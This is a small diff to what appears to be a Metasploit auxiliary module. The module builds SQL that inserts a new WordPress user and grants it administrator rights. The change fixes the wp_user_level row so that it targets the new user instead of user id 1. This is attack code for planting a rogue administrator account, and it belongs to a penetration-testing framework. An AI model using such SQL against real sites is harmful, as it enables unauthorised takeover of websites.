@@ -35,7 +35,7 @@ class Metasploit3 < Msf::Auxiliary
     # create user
     sql = "INSERT INTO #{table_prefix}users (user_login, user_pass) VALUES ('#{username}','#{Rex::Text.md5(password)}');"
     # make user administrator
-    sql << "INSERT INTO #{table_prefix}usermeta (user_id, meta_key, meta_value) VALUES ((select id from #{table_prefix}users where user_login='#{username}'),'wp_capabilities','a:1:{s:13:\"administrator\";b:1;}'),(1,'wp_user_level','10');"
+    sql << "INSERT INTO #{table_prefix}usermeta (user_id, meta_key, meta_value) VALUES ((select id from #{table_prefix}users where user_login='#{username}'),'wp_capabilities','a:1:{s:13:\"administrator\";b:1;}'),((select id from #{table_prefix}users where user_login='#{username}'),'wp_user_level','10');"
 
     sql
   end
